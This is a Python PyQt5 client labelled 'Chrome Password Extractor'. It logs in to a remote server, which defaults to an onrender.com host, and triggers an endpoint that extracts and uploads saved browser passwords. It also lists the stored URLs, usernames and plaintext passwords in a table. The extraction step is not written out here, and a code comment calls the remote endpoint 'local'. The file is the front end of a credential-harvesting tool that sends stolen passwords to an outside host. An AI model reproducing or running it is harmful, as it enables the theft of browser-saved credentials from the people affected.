import sys
import requests
import base64
import os
import json
from datetime import datetime
from PyQt5.QtWidgets import (QApplication, QMainWindow, QPushButton, QVBoxLayout, 
                          QWidget, QLabel, QLineEdit, QMessageBox, QTableWidget, 
                          QTableWidgetItem, QTabWidget, QHeaderView)
from PyQt5.QtCore import Qt

class PasswordExtractorClient(QMainWindow):
  def __init__(self):
    super().__init__()
    self.setWindowTitle("Chrome Password Extractor")
    self.setGeometry(100, 100, 800, 600)  # Make window larger
    
    # Create tab widget for different views
    self.tabs = QTabWidget()
    
    # Main tab (extraction)
    main_tab = QWidget()
    main_layout = QVBoxLayout(main_tab)
    
    # Server URL input
    self.url_label = QLabel("Server URL:")
    self.url_input = QLineEdit("https://mock-porfolio.onrender.com")
    
    # Username input
    self.username_label = QLabel("Username:")
    self.username_input = QLineEdit()
    
    # Password input
    self.password_label = QLabel("Password:")
    self.password_input = QLineEdit()
    self.password_input.setEchoMode(QLineEdit.Password)
    
    # Extract button
    self.extract_button = QPushButton("Extract & Upload Passwords")
    self.extract_button.clicked.connect(self.extract_and_upload)
    
    # View button - ADD THIS
    self.view_button = QPushButton("View Stored Passwords")
    self.view_button.clicked.connect(self.view_passwords)
    
    # Status label
    self.status_label = QLabel("Status: Ready")
    
    # Add all your input fields to main_layout
    main_layout.addWidget(self.url_label)
    main_layout.addWidget(self.url_input)
    main_layout.addWidget(self.username_label)
    main_layout.addWidget(self.username_input)
    main_layout.addWidget(self.password_label)
    main_layout.addWidget(self.password_input)
    main_layout.addWidget(self.extract_button)
    main_layout.addWidget(self.view_button)  # Add the view button
    main_layout.addWidget(self.status_label)
    
    # Create passwords tab
    self.passwords_tab = QWidget()
    passwords_layout = QVBoxLayout(self.passwords_tab)
    
    # Create table for passwords
    self.passwords_table = QTableWidget(0, 4)  # 0 rows, 4 columns
    self.passwords_table.setHorizontalHeaderLabels(["URL", "Username", "Password", "Time"])
    self.passwords_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
    
    passwords_layout.addWidget(self.passwords_table)
    
    # Add tabs
    self.tabs.addTab(main_tab, "Extract Passwords")
    self.tabs.addTab(self.passwords_tab, "View Passwords")
    
    # Set tab widget as central widget
    self.setCentralWidget(self.tabs)
    
    # Load saved settings
    self.config_file = os.path.join(os.path.expanduser("~"), ".password_extractor_config.json")
    self.load_config()
        
  def view_passwords(self):
    try:
      server_url = self.url_input.text().strip()
      username = self.username_input.text().strip()
      password = self.password_input.text().strip()
      
      if not server_url or not username or not password:
          QMessageBox.warning(self, "Input Error", "Please fill in all fields to view passwords")
          return
          
      # Authenticate and get passwords
      auth_token = base64.b64encode(f"{username}:{password}".encode()).decode()
      
      response = requests.get(
          f"{server_url}/api/user-data",
          headers={"Authorization": f"Basic {auth_token}"}
      )
      
      if response.status_code != 200:
          QMessageBox.warning(self, "Error", "Failed to retrieve passwords. Please check credentials.")
          return
          
      passwords = response.json()
      
      # Clear existing table
      self.passwords_table.setRowCount(0)
      
      # Add data to table
      for i, pwd in enumerate(passwords):
        self.passwords_table.insertRow(i)
        
        # Format the timestamp
        timestamp = pwd.get('timestamp', '')
        try:
          # Convert timestamp to readable date if it's a number
          if timestamp and timestamp.replace('.', '').isdigit():
            date = datetime.fromtimestamp(float(timestamp))
            timestamp = date.strftime('%Y-%m-%d %H:%M:%S')
        except:
          pass
            
        # Set table items
        self.passwords_table.setItem(i, 0, QTableWidgetItem(pwd.get('url', '')))
        self.passwords_table.setItem(i, 1, QTableWidgetItem(pwd.get('username', '')))
        self.passwords_table.setItem(i, 2, QTableWidgetItem(pwd.get('password', '')))
        self.passwords_table.setItem(i, 3, QTableWidgetItem(timestamp))
          
      # Switch to passwords tab
      self.tabs.setCurrentIndex(1)
      
    except Exception as e:
      QMessageBox.critical(self, "Error", f"An error occurred: {str(e)}")
          
  def load_config(self):
    """Load saved configuration"""
    try:
      if os.path.exists(self.config_file):
        with open(self.config_file, 'r') as f:
          config = json.load(f)
            
        self.url_input.setText(config.get('server_url', ''))
        self.username_input.setText(config.get('username', ''))
    except:
      # If any error occurs, just continue with defaults
      pass
      
  def save_config(self):
    """Save configuration"""
    try:
      config = {
        'server_url': self.url_input.text().strip(),
        'username': self.username_input.text().strip()
      }
      
      with open(self.config_file, 'w') as f:
        json.dump(config, f)
    except:
      # If saving fails, just continue
      pass
      
  def extract_and_upload(self):
    # At the beginning of this function, before anything else
    self.save_config()
    
    self.status_label.setText("Status: Extracting passwords...")
    
    # Get credentials
    server_url = self.url_input.text().strip()
    username = self.username_input.text().strip()
    password = self.password_input.text().strip()
    
    if not server_url or not username or not password:
      QMessageBox.warning(self, "Input Error", "Please fill in all fields")
      self.status_label.setText("Status: Failed - missing inputs")
      return
    
    try:
      # Step 1: Authenticate with server
      auth_token = base64.b64encode(f"{username}:{password}".encode()).decode()
      
      # Test authentication
      auth_response = requests.get(
        f"{server_url}/api/protected",
        headers={"Authorization": f"Basic {auth_token}"}
      )
      
      if auth_response.status_code != 200:
        QMessageBox.warning(self, "Authentication Error", "Invalid username or password")
        self.status_label.setText("Status: Failed - authentication error")
        return
          
      # Step 2: Extract passwords locally
      self.status_label.setText("Status: Authenticated. Extracting passwords...")
      
      # Use the local extract endpoint
      extract_response = requests.get(
        f"{server_url}/api/user-password",
        headers={"Authorization": f"Basic {auth_token}"}
      )
      
      if extract_response.status_code == 200:
        passwords = extract_response.json()
        count = len(passwords) if isinstance(passwords, list) else 0
        QMessageBox.information(
            self, "Success", 
            f"Successfully extracted and uploaded {count} passwords to the server"
        )
        self.status_label.setText(f"Status: Successfully extracted {count} passwords")
      else:
        error_message = extract_response.json().get('error', 'Unknown error')
        QMessageBox.warning(self, "Extraction Error", f"Failed to extract passwords: {error_message}")
        self.status_label.setText("Status: Failed - extraction error")
          
    except Exception as e:
      QMessageBox.critical(self, "Error", f"An unexpected error occurred: {str(e)}")
      self.status_label.setText(f"Status: Failed - {str(e)}")

if __name__ == "__main__":
  app = QApplication(sys.argv)
  window = PasswordExtractorClient()
  window.show()
  sys.exit(app.exec_())